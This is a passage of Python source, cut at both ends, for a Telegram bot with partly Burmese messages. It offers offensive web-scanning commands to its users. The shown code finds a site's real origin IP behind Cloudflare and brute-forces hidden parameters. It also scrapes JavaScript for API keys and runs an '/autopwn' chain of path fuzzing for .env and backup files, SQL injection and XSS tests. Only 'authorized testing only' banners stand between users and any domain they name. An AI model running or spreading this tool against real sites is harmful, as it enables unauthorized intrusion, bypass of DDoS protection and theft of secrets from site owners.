            lines.append(f"     Fields: `{'`, `'.join(f['params'][:4])}`")

    if data.get("stored"):
        lines.append(f"\n*🔴 Stored XSS Candidates — {len(data['stored'])}:*")
        for s in data["stored"][:3]:
            lines.append(f"  🔴 Form: `{s['form_url'][:60]}`")

    if data.get("header_xss"):
        lines.append(f"\n*🟠 Header-Based XSS — {len(data['header_xss'])}:*")
        for h in data["header_xss"][:3]:
            lines.append(f"  🟠 Header: `{h['header']}` reflected unescaped")

    if data["dom_sinks"]:
        lines.append(f"\n*🟠 DOM XSS Sinks — {len(data['dom_sinks'])}:*")
        for sink in data["dom_sinks"]:
            lines.append(f"  ⚠️ `{sink}`")

    if total == 0:
        lines.append("✅ No XSS vulnerabilities detected\n_Manual testing + Burp Suite still recommended_")

    lines.append("\n⚠️ _Authorized testing only. Do not use on sites you don't own._")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # ── JSON Report ────────────────────────────────
    import io as _io
    _xss_json = json.dumps(data, indent=2, default=str, ensure_ascii=False)
    _xss_buf  = _io.BytesIO(_xss_json.encode())
    _ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    _safe_dom = re.sub(r'[^\w\-]', '_', domain)
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=_xss_buf,
        filename=f"xss_{_safe_dom}_{_ts}.json",
        caption=f"🎯 XSS Report — `{domain}`\nTotal found: `{total}`",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# ④ /cloudcheck — Real IP / CDN Bypass Finder
# ══════════════════════════════════════════════════

def _is_cloudflare_ip(ip: str) -> bool:
    """Shared Cloudflare IP detection used by both TechStack and CloudCheck."""
    cf_prefixes = [
        "103.21.244.", "103.22.200.", "103.31.4.",
        "104.16.", "104.17.", "104.18.", "104.19.", "104.20.",
        "104.21.", "104.22.", "104.24.", "104.25.", "104.26.", "104.27.", "104.28.",
        "108.162.192.", "108.162.193.", "108.162.194.", "108.162.195.",
        "131.0.72.", "131.0.73.", "131.0.74.", "131.0.75.",
        "141.101.64.", "141.101.65.", "141.101.66.", "141.101.67.",
        "162.158.", "172.64.", "172.65.", "172.66.", "172.67.",
        "172.68.", "172.69.", "172.70.", "172.71.",
        "188.114.96.", "188.114.97.", "188.114.98.", "188.114.99.",
        "190.93.240.", "190.93.241.", "190.93.242.", "190.93.243.",
        "197.234.240.", "197.234.241.", "197.234.242.", "197.234.243.",
        "198.41.128.", "198.41.129.", "198.41.192.", "198.41.193.",
        "198.41.208.", "198.41.209.", "198.41.212.", "198.41.213.",
    ]
    return any(ip.startswith(p) for p in cf_prefixes)


def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
    """Find real IP behind Cloudflare/CDN."""
    results = {
        "domain": domain,
        "current_ip": "",
        "cdn_detected": [],
        "real_ip_candidates": [],
        "mx_records": [],
        "subdomains_with_ips": {},
        "historical_ips": [],
        "direct_access": [],
        "shodan_hint": "",
    }

    # ── Step 1: Current IP + CDN detect ───────────
    progress_q.append("🔍 Resolving current IP + CDN check...")
    try:
        current_ip = socket.gethostbyname(domain)
        results["current_ip"] = current_ip

        if _is_cloudflare_ip(current_ip):
            results["cdn_detected"].append("Cloudflare")

        # Also check via HTTP headers (more reliable)
        try:
            r_head = requests.get(f"https://{domain}", headers=_get_headers(),
                                  timeout=8, verify=False, allow_redirects=True)
            h_str = str(r_head.headers).lower()
            if "cf-ray" in h_str or "cf-cache-status" in h_str or "__cfduid" in h_str:
                if "Cloudflare" not in results["cdn_detected"]:
                    results["cdn_detected"].append("Cloudflare")
            if "x-amz-cf-id" in h_str or "cloudfront" in h_str:
                results["cdn_detected"].append("AWS CloudFront")
            if "x-akamai" in h_str or "akamaighost" in h_str:
                results["cdn_detected"].append("Akamai")
            if "x-fastly" in h_str or "fastly" in h_str:
                results["cdn_detected"].append("Fastly")
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    cf_ranges = results["cdn_detected"]  # reference for later use

    # ── Step 2: MX records (often direct IP) ───────
    progress_q.append("📧 Checking MX records...")
    try:
        import subprocess as _sp
        mx_result = _sp.run(
            ["nslookup", "-type=MX", domain],
            capture_output=True, text=True, timeout=8, shell=False
        )
        for line in mx_result.stdout.splitlines():
            if "mail exchanger" in line.lower() or "mx preference" in line.lower():
                mx_host = line.split()[-1].strip(".")
                try:
                    mx_ip = socket.gethostbyname(mx_host)
                    results["mx_records"].append({"host": mx_host, "ip": mx_ip})
                    if mx_ip != results["current_ip"] and not _is_cloudflare_ip(mx_ip):
                        results["real_ip_candidates"].append({
                            "ip": mx_ip, "source": "MX record", "host": mx_host
                        })
                except Exception:
                    pass
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    # ── Step 3: Common subdomains that might bypass ─
    progress_q.append("🌐 Checking subdomains for direct IPs...")
    bypass_subs = ["mail", "smtp", "ftp", "cpanel", "webmail", "direct",
                   "origin", "backend", "api", "dev", "staging", "old",
                   "panel", "admin", "beta", "test", "shop", "store"]
    sub_found = 0
    for sub in bypass_subs:
        hostname = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(hostname)
            if ip != results["current_ip"] and ip not in ["127.0.0.1", ""]:
                is_cf = _is_cloudflare_ip(ip)
                if not is_cf:
                    results["real_ip_candidates"].append({
                        "ip": ip, "source": f"subdomain ({sub})", "host": hostname
                    })
                results["subdomains_with_ips"][hostname] = {
                    "ip": ip, "is_cf": is_cf
                }
                sub_found += 1
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
    progress_q.append(f"✅ Subdomains: `{sub_found}` resolved")

    # ── Step 4: Try historical DNS (SecurityTrails-style via public APIs) ──
    progress_q.append("📚 Checking public passive DNS sources...")
    try:
        # HackerTarget passive DNS
        r = requests.get(
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            timeout=8
        )
        if r.status_code == 200 and "error" not in r.text[:30].lower():
            ips_seen = set()
            for line in r.text.strip().split("\n"):
                if "," in line:
                    parts = line.split(",")
                    if len(parts) >= 2:
                        ip_found = parts[1].strip()
                        if re.match(r'^\d+\.\d+\.\d+\.\d+$', ip_found):
                            if ip_found not in ips_seen:
                                ips_seen.add(ip_found)
                                results["historical_ips"].append(ip_found)
            # Filter CF IPs
            non_cf = [ip for ip in results["historical_ips"]
                      if not _is_cloudflare_ip(ip)]
            for ip in non_cf[:5]:
                results["real_ip_candidates"].append({
                    "ip": ip, "source": "passive DNS (HackerTarget)", "host": domain
                })
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    # ── Step 5: Test direct IP access ─────────────
    progress_q.append("🔗 Testing direct IP connections...")
    unique_candidates = list({c["ip"]: c for c in results["real_ip_candidates"]}.values())
    for cand in unique_candidates[:5]:
        try:
            r = requests.get(
                f"http://{cand['ip']}", headers={**_get_headers(), "Host": domain},
                timeout=5, verify=False, allow_redirects=False
            )
            results["direct_access"].append({
                "ip": cand["ip"], "status": r.status_code,
                "server": r.headers.get("Server","?"),
                "source": cand["source"]
            })
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    # ── Step 6: IPv6 real IP detection ───────────
    progress_q.append("🔢 Checking IPv6 addresses (CDN bypass)...")
    try:
        import socket as _sock
        ipv6_results = _sock.getaddrinfo(domain, None, _sock.AF_INET6)
        for res in ipv6_results:
            ipv6_addr = res[4][0]
            if ipv6_addr and ipv6_addr != "::1":
                results["real_ip_candidates"].append({
                    "ip": ipv6_addr, "source": "IPv6 DNS record", "host": domain
                })
                results.setdefault("ipv6_addresses", []).append(ipv6_addr)
                progress_q.append(f"🔢 IPv6 found: `{ipv6_addr}`")
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    # Deduplicate candidates
    seen_ips = set()
    deduped = []
    for c in results["real_ip_candidates"]:
        if c["ip"] not in seen_ips:
            seen_ips.add(c["ip"])
            deduped.append(c)
    results["real_ip_candidates"] = deduped

    return results


async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/cloudcheck <domain> — Find real IP behind Cloudflare/CDN"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/cloudcheck example.com`\n\n"
            "☁️ *Finds real IP behind CDN/Cloudflare via:*\n"
            "  ① MX records (email servers)\n"
            "  ② Subdomain scanning (mail, ftp, origin…)\n"
            "  ③ Passive DNS history (HackerTarget)\n"
            "  ④ Direct IP connection test\n\n"
            "🎯 _If found, tests Host: header bypass_",
            parse_mode='Markdown'
        )
        return

    raw = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0].lower()
    if not re.match(r'^[a-z0-9][a-z0-9\-.]+\.[a-z]{2,}$', raw):
        await update.effective_message.reply_text("❌ Invalid domain. Example: `example.com`", parse_mode='Markdown')
        return

    # SSRF check
    try:
        apex_ip = socket.gethostbyname(raw)
        if not _is_safe_ip(apex_ip):
            await update.effective_message.reply_text(f"🚫 Private IP blocked", parse_mode='Markdown')
            return
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "CloudCheck"

    msg = await update.effective_message.reply_text(
        f"☁️ *Cloud/CDN Bypass — `{raw}`*\n\n"
        "① MX records...\n② Subdomains...\n③ Passive DNS...\n⏳",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(f"☁️ *CloudCheck — `{raw}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    try:
        data = await asyncio.to_thread(_cloudcheck_sync, raw, progress_q)
    except Exception as e:
        prog.cancel()
        _active_scans.pop(uid, None)
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    candidates = data.get("real_ip_candidates", [])
    lines = [
        f"☁️ *Cloud/CDN Bypass — `{raw}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🌐 Current IP: `{data.get('current_ip','?')}`",
        f"🛡 CDN: `{'`, `'.join(data['cdn_detected']) if data['cdn_detected'] else 'Not detected'}`",
        "",
    ]

    if data["mx_records"]:
        lines.append("*📧 MX Records:*")
        for mx in data["mx_records"][:3]:
            lines.append(f"  `{mx['host']}` → `{mx['ip']}`")
        lines.append("")

    if candidates:
        lines.append(f"*🎯 Real IP Candidates ({len(candidates)}):*")
        for c in candidates[:8]:
            lines.append(f"  🔴 `{c['ip']}` — via {c['source']}")
        lines.append("")
    else:
        lines.append("*🔒 No bypass candidates found*\n_(Cloudflare properly configured)_\n")

    if data["direct_access"]:
        lines.append("*🔗 Direct Access Test:*")
        for d in data["direct_access"][:5]:
            icon = "✅" if d["status"] == 200 else "⚠️"
            lines.append(f"  {icon} `{d['ip']}` HTTP `{d['status']}` | `{d['server']}`")
        lines.append("")

    if data["historical_ips"]:
        lines.append(f"*📚 Historical IPs ({len(data['historical_ips'])}):*")
        for ip in data["historical_ips"][:5]:
            lines.append(f"  `{ip}`")

    if not candidates and not data["direct_access"]:
        lines.append("✅ _Domain appears well-protected behind CDN_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
    import io as _io
    _rj = json.dumps(data, indent=2, default=str, ensure_ascii=False)
    _rb = _io.BytesIO(_rj.encode())
    _ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    _sd = re.sub(r'[^\w\-]', '_', raw)
    await context.bot.send_document(
        chat_id=update.effective_chat.id, document=_rb,
        filename=f"cloudcheck_{_sd}_{_ts}.json",
        caption=f"☁️ CloudCheck Report — `{raw}`\nReal IPs: `{len(data.get('real_ip_candidates',[]))}`",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# ⑤ /paramfuzz — Advanced Parameter Fuzzer (Arjun-style)
# ══════════════════════════════════════════════════

_PARAMFUZZ_WORDLIST = [
    # Auth / User
    "id","user","username","email","password","pass","pwd","token","key","secret",
    "auth","login","logout","session","cookie","jwt","bearer","oauth","apikey","api_key",
    "access_token","refresh_token","hash","uid","userid","user_id",
    # Common params
    "action","page","size","limit","offset","skip","sort","order","dir","direction",
    "search","q","query","keyword","keywords","term","text","s","v","n","t",
    "from","to","date","start","end","begin","year","month","day",
    # Content / File
    "file","filename","filepath","path","dir","folder","url","uri","src","source",
    "dest","destination","redirect","return","next","back","ref","referrer","goto",
    "view","type","mode","format","output","template","theme","lang","language",
    "locale","country","region","timezone","tz","currency",
    # IDs
    "product_id","item_id","cat_id","category_id","post_id","article_id","news_id",
    "order_id","invoice_id","payment_id","account_id","profile_id","member_id",
    "pid","cid","aid","mid","rid","oid","bid","gid","tid","vid","fid","sid",
    # API
    "api","version","v1","v2","v3","endpoint","resource","method","callback",
    "jsonp","format","fields","include","exclude","expand","embed","populate",
    "depth","level","page_size","per_page","count","total","max","min",
    # Debug / Admin
    "debug","test","admin","root","preview","draft","cache","flush","reset",
    "refresh","reload","force","override","bypass","skip","ignore","disable",
    "enable","feature","flag","config","setting","env","environment",
    # App-specific
    "shop","store","cart","checkout","coupon","promo","code","voucher","discount",
    "wishlist","compare","review","rating","comment","tag","category","brand",
    "color","size","weight","quantity","qty","stock","price","currency",
]

def _paramfuzz_sync(url: str, method: str, progress_q: list) -> dict:
    """Advanced parameter discovery — Arjun-style."""
    results = {
        "found_params": [],
        "method": method,
        "total_tested": 0,
        "interesting": [],
    }

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    existing = {}
    if parsed.query:
        for part in parsed.query.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                existing[k] = v

    progress_q.append(f"🧪 Testing `{len(_PARAMFUZZ_WORDLIST)}` params [{method}]...")

    # ── Baseline request ───────────────────────────
    try:
        if method == "GET":
            r_base = requests.get(base, params=existing, headers=_get_headers(),
                                  timeout=8, verify=False)
        else:
            r_base = requests.post(base, data=existing, headers=_get_headers(),
                                   timeout=8, verify=False)
        baseline_len  = len(r_base.text)
        baseline_hash = hashlib.md5(r_base.text[:1000].encode()).hexdigest()
        baseline_code = r_base.status_code
    except Exception:
        baseline_len, baseline_hash, baseline_code = 0, "", 200

    CHUNK = 30  # test 30 params at once
    found_raw = []

    for i in range(0, len(_PARAMFUZZ_WORDLIST), CHUNK):
        chunk = _PARAMFUZZ_WORDLIST[i:i+CHUNK]
        # Build multi-param request
        test_params = dict(existing)
        for p in chunk:
            test_params[p] = "FUZZ_VALUE_12345"

        try:
            if method == "GET":
                r = requests.get(base, params=test_params, headers=_get_headers(),
                                 timeout=8, verify=False)
            else:
                r = requests.post(base, data=test_params, headers=_get_headers(),
                                  timeout=8, verify=False)

            # If different from baseline, narrow down
            if (abs(len(r.text) - baseline_len) > 20 or
                r.status_code != baseline_code):
                # Binary search within chunk
                for param in chunk:
                    try:
                        single = dict(existing)
                        single[param] = "FUZZ_VALUE_12345"
                        if method == "GET":
                            r2 = requests.get(base, params=single, headers=_get_headers(),
                                              timeout=6, verify=False)
                        else:
                            r2 = requests.post(base, data=single, headers=_get_headers(),
                                               timeout=6, verify=False)

                        diff = abs(len(r2.text) - baseline_len)
                        if diff > 20 or r2.status_code != baseline_code:
                            found_raw.append({
                                "param": param,
                                "status": r2.status_code,
                                "size_diff": diff,
                                "orig_status": baseline_code,
                            })
                    except Exception:
                        pass

            results["total_tested"] += len(chunk)
            if i % (CHUNK * 5) == 0:
                progress_q.append(
                    f"🔍 Tested `{results['total_tested']}/{len(_PARAMFUZZ_WORDLIST)}` | "
                    f"`{len(found_raw)}` found"
                )
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    # ── Classify interesting params ────────────────
    interesting_names = {
        "file", "path", "url", "redirect", "goto", "next", "src", "dest",
        "include", "require", "load", "cmd", "command", "exec", "shell",
        "template", "debug", "admin", "root", "config", "env"
    }

    results["found_params"] = found_raw
    for p in found_raw:
        if p["param"].lower() in interesting_names:
            results["interesting"].append(p)

    return results


async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/paramfuzz <url> [get|post] — Advanced parameter discovery"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:*\n"
            "`/paramfuzz https://example.com/search`\n"
            "`/paramfuzz https://example.com/api post`\n\n"
            f"🔬 *{len(_PARAMFUZZ_WORDLIST)} parameters tested*\n"
            "  • Auth params (token, key, jwt…)\n"
            "  • Content params (id, page, file, url…)\n"
            "  • Debug params (admin, debug, env…)\n"
            "  • Batch testing (30 params/request)\n"
            "  • Size-diff & status-change detection\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    method = "POST" if len(context.args) > 1 and context.args[1].upper() == "POST" else "GET"

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "ParamFuzz"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🔬 *ParamFuzz — `{domain}`* [{method}]\n\n"
        f"Testing `{len(_PARAMFUZZ_WORDLIST)}` parameters...\n⏳",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔬 *ParamFuzz — `{domain}`* [{method}]\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_paramfuzz_sync, url, method, progress_q)
    except Exception as e:
        prog.cancel()
        _active_scans.pop(uid, None)
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    found = data["found_params"]
    interesting = data["interesting"]

    lines = [
        f"🔬 *ParamFuzz Results — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"Method: `{method}` | Tested: `{data['total_tested']}`",
        f"Found: `{len(found)}` params | 🔴 Interesting: `{len(interesting)}`",
        "",
    ]

    if interesting:
        lines.append(f"*🔴 High-Interest Parameters:*")
        for p in interesting[:10]:
            diff_str = f"+{p['size_diff']}B" if p['size_diff'] else f"status {p['status']}"
            lines.append(f"  ⚠️ `{p['param']}` — {diff_str}")
        lines.append("")

    if found:
        normal = [p for p in found if p not in interesting]
        if normal:
            lines.append(f"*📋 Other Active Parameters ({len(normal)}):*")
            for p in normal[:15]:
                lines.append(f"  ✅ `{p['param']}` (status: `{p['status']}`, diff: `{p['size_diff']}B`)")
        if len(found) > 15:
            lines.append(f"  _...and {len(found)-15} more_")
    else:
        lines.append("❓ No hidden parameters discovered\n_Try POST method: `/paramfuzz <url> post`_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # ── Export ALL results as TXT (full URLs) — no truncation ──
    if found:
        import io as _io
        _ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        _sd  = re.sub(r'[^\w\-]', '_', domain)
        _txt = [
            f"# ParamFuzz Results — {url}",
            f"# Method: {method} | Tested: {data['total_tested']} | Found: {len(found)} | Interesting: {len(interesting)}",
            f"# Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
        ]
        if interesting:
            _txt.append("## HIGH-INTEREST PARAMETERS (response size diff > threshold)")
            for p in interesting:
                diff_str = f"+{p['size_diff']}B" if p['size_diff'] else f"status {p['status']}"
                _txt.append(f"{url}?{p['param']}=FUZZ   # status:{p['status']} diff:{diff_str}")
            _txt.append("")
        normal = [p for p in found if p not in interesting]
        if normal:
            _txt.append("## OTHER ACTIVE PARAMETERS")
            for p in normal:
                _txt.append(f"{url}?{p['param']}=FUZZ   # status:{p['status']} diff:{p['size_diff']}B")
        _rb = _io.BytesIO("\n".join(_txt).encode("utf-8"))
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_rb,
            filename=f"paramfuzz_{_sd}_{_ts}.txt",
            caption=(
                f"📄 *ParamFuzz Export — `{domain}`*\n"
                f"🔴 Interesting: `{len(interesting)}` | ✅ Total: `{len(found)}`"
            ),
            parse_mode='Markdown'
        )




# ══════════════════════════════════════════════════
# 🔑 _extract_secrets_sync — used by /autopwn Phase 3
# ══════════════════════════════════════════════════

def _extract_secrets_sync(url: str, progress_q: list) -> dict:
    """Lightweight secret scan for /autopwn Phase 3."""
    results = {"findings": [], "js_count": 0}
    seen    = set()
    try:
        resp = requests.get(url, headers=_get_headers(), timeout=15, verify=False, allow_redirects=True)
        soup = BeautifulSoup(resp.text, _BS_PARSER)
        sources = {"index.html": resp.text}
        js_idx = 0
        for tag in soup.find_all('script', src=True):
            if js_idx >= 10: break
            js_url = urljoin(url, tag['src']) if not tag['src'].startswith('http') else tag['src']
            safe_ok, _ = is_safe_url(js_url)
            if not safe_ok: continue
            try:
                jr = requests.get(js_url, headers=_get_headers(), timeout=8, verify=False)
                if jr.status_code == 200 and jr.text.strip():
                    sources[f"js_{js_idx:03d}.js"] = jr.text
                    js_idx += 1
            except Exception:
                pass
        results["js_count"] = js_idx
        for fname, content in sources.items():
            for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                try:
                    for match in re.finditer(pattern, content, re.I):
                        val = match.group(0)
                        key = stype + val[:30]
                        if key in seen: continue
                        seen.add(key)
                        redacted = val[:8] + "…" + val[-4:] if len(val) > 16 else val[:6] + "…"
                        results["findings"].append({"type": stype, "risk": risk,
                            "value_redacted": redacted, "file": fname})
                except re.error:
                    pass
    except Exception as e:
        results["error"] = str(e)
    return results

# ══════════════════════════════════════════════════
# ⑥ /autopwn — Full Auto Exploit Chain
# ══════════════════════════════════════════════════

async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/autopwn <url> — Full automated pentest chain"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/autopwn https://example.com`\n\n"
            "🤖 *Auto Pentest Chain (7 phases):*\n"
            "  ① TechStack fingerprint\n"
            "  ② Path fuzzing (hidden dirs)\n"
            "  ③ Secret scanning (API keys)\n"
            "  ④ SQL injection test\n"
            "  ⑤ XSS scanning\n"
            "  ⑥ Parameter discovery\n"
            "  ⑦ Full report generation\n\n"
            "⏱ _Takes 2-5 minutes for full scan_\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "AutoPwn"
    try:

        domain = urlparse(url).hostname
        msg = await update.effective_message.reply_text(
            f"🤖 *AutoPwn — `{domain}`*\n\n"
            "Phase 1/7: TechStack... ⏳",
            parse_mode='Markdown'
        )

        # Track scan in DB
        async with db_lock:
            _db = _load_db_sync()
            track_scan(_db, uid, "AutoPwn", domain)
            _save_db_sync(_db)

        report = {
            "target": url, "domain": domain,
            "scanned_at": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "tech": {}, "fuzz": [], "secrets": {},
            "sqli": {}, "xss": {}, "params": {},
            "vulns": [], "risk_score": 0,
        }

        _phase_done = []

        async def _update(text):
            # Track completed phases for history display
            if any(x in text for x in ["✅","🔴","⚠️"]):
                _phase_done.append(text.split("\n")[0][:70])
            history = ""
            if _phase_done:
                history = "\n".join(f"  ✔ `{p}`" for p in _phase_done[-4:]) + "\n\n"
            try:
                await msg.edit_text(
                    f"🤖 *AutoPwn — `{domain}`*\n\n{history}⏳ {text}",
                    parse_mode='Markdown'
                )
            except Exception as _e:
                logging.debug("autopwn update error: %s", _e)

        # ── Phase 1: TechStack ─────────────────────────
        await _update("Phase 1/7: 🔍 TechStack fingerprint...")
        try:
            pq = []
            report["tech"] = await asyncio.to_thread(_techstack_scan_sync, url, pq)
            detected_count = sum(len(v) for v in report["tech"].get("detected",{}).values())
            await _update(f"Phase 1/7: ✅ TechStack: `{detected_count}` techs\nPhase 2/7: 🧪 Path fuzzing...")
        except Exception as e:
            await _update(f"Phase 1/7: ⚠️ Tech error: `{e}`\nPhase 2/7: 🧪 Fuzzing...")

        # ── Phase 2: Path Fuzz ─────────────────────────
        try:
            base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            pq = []
            fuzz_results, _ = await asyncio.to_thread(_fuzz_sync, base_url, "paths", pq)
            report["fuzz"] = fuzz_results[:20]
            critical_paths = [r for r in fuzz_results if r["status"] == 200 and
                              any(w in r["url"].lower() for w in
                                  ['admin','backup','.env','config','.sql','debug'])]
            if critical_paths:
                report["vulns"].append(f"🔴 {len(critical_paths)} critical paths exposed")
                report["risk_score"] += len(critical_paths) * 10
            await _update(
                f"Phase 2/7: ✅ Fuzzing: `{len(fuzz_results)}` found (`{len(critical_paths)}` critical)\n"
                "Phase 3/7: 🔑 Secret scanning..."
            )
        except Exception as e:
            await _update(f"Phase 2/7: ⚠️ Fuzz err: `{type(e).__name__}`\nPhase 3/7: 🔑 Secret scanning...")

        # ── Phase 3: Secrets ───────────────────────────
        try:
            pq = []
            secret_data = await asyncio.to_thread(_extract_secrets_sync, url, pq)
            findings = secret_data.get("findings", [])
            critical_secrets = [f for f in findings if f.get("risk") == "🔴"]
            report["secrets"] = {"total": len(findings), "critical": len(critical_secrets)}
            if findings:
                report["vulns"].append(f"🔴 {len(findings)} secrets found ({len(critical_secrets)} critical)")
                report["risk_score"] += len(critical_secrets) * 20 + len(findings) * 5
            await _update(
                f"Phase 3/7: ✅ Secrets: `{len(findings)}` found\n"
                "Phase 4/7: 💉 SQLi testing..."
            )
        except Exception as e:
            await _update(f"Phase 3/7: ⚠️ Secrets err: `{type(e).__name__}`\nPhase 4/7: 💉 SQLi testing...")

        # ── Phase 4: SQLi ──────────────────────────────
        try:
            pq = []
            sqli_data = await asyncio.to_thread(_sqli_scan_sync, url, pq)
            report["sqli"] = sqli_data
            if sqli_data["total_found"] > 0:
                report["vulns"].append(f"🔴 SQLi: {sqli_data['total_found']} found (DB: {sqli_data['db_type']})")
                report["risk_score"] += sqli_data["total_found"] * 30
            await _update(
                f"Phase 4/7: {'🔴 SQLi FOUND!' if sqli_data['total_found'] else '✅ SQLi: Clean'}\n"
                "Phase 5/7: 🎯 XSS scanning..."
            )
        except Exception as e:
            await _update(f"Phase 4/7: ⚠️ SQLi err: `{type(e).__name__}`\nPhase 5/7: 🎯 XSS scanning...")

        # ── Phase 5: XSS ──────────────────────────────
        try:
            pq = []
            xss_data = await asyncio.to_thread(_xss_scan_sync, url, pq)
            report["xss"] = xss_data
            if xss_data["total_found"] > 0:
                report["vulns"].append(f"🔴 XSS: {xss_data['total_found']} found")
                report["risk_score"] += xss_data["total_found"] * 25
            await _update(
                f"Phase 5/7: {'🔴 XSS FOUND!' if xss_data['total_found'] else '✅ XSS: Clean'}\n"
                "Phase 6/7: 🔬 Parameter discovery..."
            )
        except Exception as e:
            await _update(f"Phase 5/7: ⚠️ XSS err: `{type(e).__name__}`\nPhase 6/7: 🔬 Parameters...")

        # ── Phase 6: ParamFuzz ─────────────────────────
        try:
            pq = []
            param_data = await asyncio.to_thread(_paramfuzz_sync, url, "GET", pq)
            report["params"] = param_data
            interesting = param_data.get("interesting", [])
            if interesting:
                report["vulns"].append(f"⚠️ {len(interesting)} interesting params found")
                report["risk_score"] += len(interesting) * 5
            await _update(
                f"Phase 6/7: ✅ Params: `{len(param_data['found_params'])}` found\n"
                "Phase 7/7: 📊 Generating report..."
            )
        except Exception as e:
            await _update(f"Phase 6/7: ⚠️ Params err: `{type(e).__name__}`\nPhase 7/7: 📊 Report...")

        # ── Phase 7: Report ────────────────────────────
        risk = report["risk_score"]
        if risk >= 80:
            risk_level = "🔴 CRITICAL"
        elif risk >= 50:
            risk_level = "🟠 HIGH"
        elif risk >= 20:
            risk_level = "🟡 MEDIUM"
